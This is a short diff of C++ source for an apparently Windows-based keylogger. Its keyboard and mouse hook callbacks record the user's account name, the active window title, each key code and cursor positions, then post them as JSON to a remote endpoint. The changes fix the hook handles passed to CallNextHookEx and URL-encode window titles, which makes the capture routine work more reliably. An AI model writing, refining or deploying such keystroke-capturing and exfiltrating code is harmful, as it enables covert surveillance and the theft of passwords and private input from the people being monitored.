@@ -74,7 +74,7 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 		json j;
 		j["accountName"] = account_name();
 		j["dateTime"] = now("%Y-%m-%dT%X");
-		j["program"] = window_title();
+		j["program"] = util::urlEncode(window_title());
 		j["keyCode"] = std::to_string(p->vkCode);
 
 		PostAsync(
@@ -82,7 +82,7 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 			Body{j.dump()},
 			Header{{"Content-Type", "application/json"}});
 
-		return CallNextHookEx(nullptr, code, wParam, lParam);
+		return CallNextHookEx(hKeyboardHook, code, wParam, lParam);
 	}
 }
 
@@ -90,7 +90,7 @@ LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
 {
 	if (code < 0)
 	{
-		CallNextHookEx(nullptr, code, wParam, lParam);
+		CallNextHookEx(hMouseHook, code, wParam, lParam);
 		return 0;
 	}
 
@@ -110,12 +110,12 @@ LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
 	}
 	else
 	{
-		return CallNextHookEx(nullptr, code, wParam, lParam);
+		return CallNextHookEx(hMouseHook, code, wParam, lParam);
 	}
 
 	j["accountName"] = account_name();
 	j["dateTime"] = now("%Y-%m-%dT%X");
-	j["program"] = window_title();;
+	j["program"] = util::urlEncode(window_title());
 	j["x"] = std::to_string(p->pt.x);
 	j["y"] = std::to_string(p->pt.y);
 
